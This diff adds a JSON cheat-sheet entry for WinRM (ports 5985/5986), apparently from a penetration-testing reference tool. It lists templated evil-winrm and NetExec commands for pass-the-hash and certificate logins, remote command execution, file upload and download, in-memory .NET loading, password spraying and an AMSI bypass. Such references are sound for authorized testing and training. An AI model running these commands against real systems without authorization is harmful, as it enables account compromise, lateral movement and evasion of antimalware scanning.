@@ -1,0 +1,110 @@
+{
+  "port": 5985,
+  "protocol": "tcp",
+  "service": "WinRM",
+  "description": "Windows Remote Management (HTTP) — remote PowerShell sessions, command execution, and file transfer. Port 5986 is the HTTPS variant.",
+  "tools": [
+    {
+      "name": "evil-winrm",
+      "description": "Ultimate WinRM shell with file transfer, PowerShell script loading, .NET binary execution, and multiple auth methods.",
+      "commands": [
+        {
+          "title": "Login with password",
+          "command": "evil-winrm -i {{IP}} -u '{{USERNAME}}' -p '{{PASSWORD}}'",
+          "description": "Connect with standard username/password authentication."
+        },
+        {
+          "title": "Login with PtH",
+          "command": "evil-winrm -i {{IP}} -u '{{USERNAME}}' -H '{{HASH}}'",
+          "description": "Connect using pass-the-hash (NTLM hash)."
+        },
+        {
+          "title": "Login with SSL (port 5986)",
+          "command": "evil-winrm -i {{IP}} -u '{{USERNAME}}' -p '{{PASSWORD}}' -S -P 5986",
+          "description": "Connect over HTTPS/SSL on port 5986."
+        },
+        {
+          "title": "Login with Kerberos",
+          "command": "evil-winrm -i {{TARGET_HOSTNAME}} -r '{{DOMAIN}}'",
+          "description": "Connect using Kerberos authentication (requires valid ccache via KRB5CCNAME)."
+        },
+        {
+          "title": "Login with certificate (ADCS)",
+          "command": "evil-winrm -i {{IP}} -c cert.pem -k key.pem -S -P 5986",
+          "description": "Connect using a client certificate and private key (AD CS exploitation)."
+        },
+        {
+          "title": "Load PowerShell scripts",
+          "command": "evil-winrm -i {{IP}} -u '{{USERNAME}}' -p '{{PASSWORD}}' -s /opt/scripts/",
+          "description": "Connect and load all .ps1 scripts from the specified directory (use menu to invoke)."
+        },
+        {
+          "title": "Load .NET binaries",
+          "command": "evil-winrm -i {{IP}} -u '{{USERNAME}}' -p '{{PASSWORD}}' -e /opt/binaries/",
+          "description": "Connect and make .NET executables available for in-memory execution."
+        },
+        {
+          "title": "Upload a file (in session)",
+          "command": "upload /local/path/to/file.exe C:\\Windows\\Temp\\file.exe",
+          "description": "Upload a local file to the target (run inside evil-winrm session)."
+        },
+        {
+          "title": "Download a file (in session)",
+          "command": "download C:\\Users\\Administrator\\Desktop\\flag.txt /tmp/flag.txt",
+          "description": "Download a remote file to your local machine (run inside evil-winrm session)."
+        },
+        {
+          "title": "Execute inline PowerShell",
+          "command": "evil-winrm -i {{IP}} -u '{{USERNAME}}' -p '{{PASSWORD}}' -c 'Get-Process; Get-Service'",
+          "description": "Execute PowerShell commands directly without an interactive session."
+        },
+        {
+          "title": "Bypass AMSI (in session)",
+          "command": "Bypass-4MSI",
+          "description": "Attempt to bypass AMSI (Antimalware Scan Interface) in the current session."
+        }
+      ]
+    },
+    {
+      "name": "NetExec (nxc) — WinRM",
+      "description": "WinRM credential validation and remote command execution via NetExec.",
+      "commands": [
+        {
+          "title": "Check WinRM access with password",
+          "command": "nxc winrm {{IP}} -u '{{USERNAME}}' -p '{{PASSWORD}}'",
+          "description": "Test if credentials have WinRM access (Pwn3d! = admin)."
+        },
+        {
+          "title": "Check WinRM access with PtH",
+          "command": "nxc winrm {{IP}} -u '{{USERNAME}}' -H '{{HASH}}'",
+          "description": "Test WinRM access using pass-the-hash."
+        },
+        {
+          "title": "Execute CMD command",
+          "command": "nxc winrm {{IP}} -u '{{USERNAME}}' -p '{{PASSWORD}}' -x 'whoami /all'",
+          "description": "Execute a CMD command via WinRM."
+        },
+        {
+          "title": "Execute PowerShell command",
+          "command": "nxc winrm {{IP}} -u '{{USERNAME}}' -p '{{PASSWORD}}' -X 'Get-Process'",
+          "description": "Execute a PowerShell command via WinRM."
+        },
+        {
+          "title": "Execute with PtH",
+          "command": "nxc winrm {{IP}} -u '{{USERNAME}}' -H '{{HASH}}' -x 'ipconfig /all'",
+          "description": "Execute a command via WinRM using pass-the-hash."
+        },
+        {
+          "title": "Password spray",
+          "command": "nxc winrm {{IP}} -u {{USERLIST}} -p '{{PASSWORD}}' --continue-on-success",
+          "description": "Spray a password against multiple users via WinRM."
+        },
+        {
+          "title": "Check WinRM with Kerberos",
+          "command": "nxc winrm {{IP}} -u '{{USERNAME}}' -p '{{PASSWORD}}' -k",
+          "description": "Test WinRM access using Kerberos authentication."
+        }
+      ]
+    }
+  ]
+}
